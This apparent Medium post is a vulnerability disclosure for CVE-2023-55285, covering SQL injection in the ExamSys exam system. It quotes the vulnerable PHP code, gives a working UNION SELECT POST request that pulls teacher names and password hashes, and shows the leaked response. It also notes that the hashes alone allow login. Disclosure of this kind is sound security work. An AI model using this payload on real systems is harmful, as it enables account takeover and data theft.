[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fef94d84e440c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Ffh4ntke.medium.com%2Fexamsys-multiple-sql-injections-ef94d84e440c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Ffh4ntke.medium.com%2Fexamsys-multiple-sql-injections-ef94d84e440c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# ExamSys — Multiple SQL Injections

[![FHantke](https://miro.medium.com/v2/resize:fill:88:88/2*RdS94J4UyvANk6guwm7N0w.jpeg)](/?source=post_page---byline--ef94d84e440c--------------------------------)

[FHantke](/?source=post_page---byline--ef94d84e440c--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F46ad409a9c9f&operation=register&redirect=https%3A%2F%2Ffh4ntke.medium.com%2Fexamsys-multiple-sql-injections-ef94d84e440c&user=FHantke&userId=46ad409a9c9f&source=post_page-46ad409a9c9f--byline--ef94d84e440c---------------------post_header-----------)

2 min read·Jan 14, 2024

--

Listen

Share

ExamSys is an open source online exam system. During a routine scan through GitHub, [this repository](https://github.com/lrx0014/ExamSys/tree/master) was found vulnerable to multiple SQL Injections (SQLi) in all its SQL statements. It allows an attacker to receive user information like passwords or grades.

The vulnerability was assigned CVE-2023–55285 and affects the current version v1.0.0. No fixed version is available.
CVSS 9.1 [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV%3AN%2FAC%3AL%2FPR%3AN%2FUI%3AN%2FS%3AU%2FC%3AH%2FI%3AH%2FA%3AN&version=3.1)

This CVE was also part of a little experiment wrote down in the article below.

[## How to Get CVEs Online (Fast)

### Some thoughts about CVEs

fh4ntke.medium.com](/how-to-get-cves-online-fast-c0d6d897c04d?source=post_page-----ef94d84e440c--------------------------------)
# Example Attack

As all SQL statements are vulnerable to SQLi, this report gives only one example of an attack. The vulnerable code for this example can be found in the file Pages.php:

[## ExamSys/ExamSys/Support/action/Pages.php at master · lrx0014/ExamSys

### An Online Exam System. Contribute to lrx0014/ExamSys development by creating an account on GitHub.

github.com](https://github.com/lrx0014/ExamSys/blob/master/ExamSys/Support/action/Pages.php?source=post_page-----ef94d84e440c--------------------------------#L17)

The code takes the user provided POST parameters and puts them into the SQL statement’s where condition. Later this statement is executed returning the results as JSON.

```

if (isset($_POST['s_score2']) && $_POST['s_score2']!="") {
    $score2 = $_POST['s_score2'];
} else {
    $score2 = '9999';
}

$sql1 = "
    Select StuId, StuName,lastTime,total
    from gradeview
    Where StuName LIKE '".$name."'
    And StuId LIKE '".$id."'
    And total BETWEEN '".$score1."' And '".$score2."' limit $offset,$perPageNums;";

$sql2 = "select count(*) count from gradeview
    where StuName LIKE '".$name."'
    And StuId LIKE '".$id."'
    And total BETWEEN '".$score1."' And '".$score2."';";

$resource1 = mysql_query($sql1);
$resource2 = mysql_query($sql2);
$count = mysql_fetch_assoc($resource2);
while ($row = mysql_fetch_assoc($resource1)) {
    $result[] = $row;
}
echo json_encode(array('datas' => $result,'total' => $count['count']));
```

The following example request escapes the condition and uses an UNION SELECT to receive the ID, name, and password of all teachers.

```
POST /Support/action/Pages.php HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Content-Length: 130

currentPage=1
&s_id=1
&s_name=a
&s_score1=
&s_score2='+UNION+SELECT+TeacherId,TeacherName,TeacherPassword,-1+FROM+teacher;--+-
```

As expected, the response contains the sensitive information. Since the password hashing is executed on the client side, the hashed password is enough to login.

```
HTTP/1.1 200 OK
Date: Sun, 07 Jan 2024 11:24:58 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Vary: Accept-Encoding
Content-Length: 223
Content-Type: text/html;charset=utf-8

{
  "datas":[{
    "StuId":"1234",
    "StuName":"MrTeacher",
    "lastTime":"9a84ee41aa72de59c63006aad670bcce",
    "total":"-1"
 },{
    "StuId":"1235",
    "StuName":"GreatTeacher",
    "lastTime":"148e2b41aa72de59c6356haad670baec",
    "total":"-1"
  }],
  "total":null
}
```
![]()
# Disclosing Timeline

Since a Shodan scan showed no public facing instances of this application, it was decided to wait for the CVE response from Mitre and notify the developer afterwards.

27.09.2023: Vulnerability discovered and CVE requested
31.12.2023: CVE assigned
07.01.2024: Vendor was notified
14.01.2024: Publicly disclosed

[Hacking](https://medium.com/tag/hacking?source=post_page-----ef94d84e440c--------------------------------)[Technology](https://medium.com/tag/technology?source=post_page-----ef94d84e440c--------------------------------)[Open Source](https://medium.com/tag/open-source?source=post_page-----ef94d84e440c--------------------------------)[Web Development](https://medium.com/tag/web-development?source=post_page-----ef94d84e440c--------------------------------)[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----ef94d84e440c--------------------------------)

--

--

[![FHantke](https://miro.medium.com/v2/resize:fill:96:96/2*RdS94J4UyvANk6guwm7N0w.jpeg)](/?source=post_page---post_author_info--ef94d84e440c--------------------------------)[![FHantke](https://miro.medium.com/v2/resize:fill:128:128/2*RdS94J4UyvANk6guwm7N0w.jpeg)](/?source=post_page---post_author_info--ef94d84e440c--------------------------------)Follow[## Written by FHantke](/?source=post_page---post_author_info--ef94d84e440c--------------------------------)[200 Followers](/followers?source=post_page---post_author_info--ef94d84e440c--------------------------------)·[17 Following](/following?source=post_page---post_author_info--ef94d84e440c--------------------------------)

Computer Science Student. Interested in IT security and forensics. <https://fhantke.de/>

Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----ef94d84e440c--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----ef94d84e440c--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----ef94d84e440c--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----ef94d84e440c--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----ef94d84e440c--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----ef94d84e440c--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----ef94d84e440c--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----ef94d84e440c--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----ef94d84e440c--------------------------------)[Teams](https://medium.com/business?source=post_page-----ef94d84e440c--------------------------------)

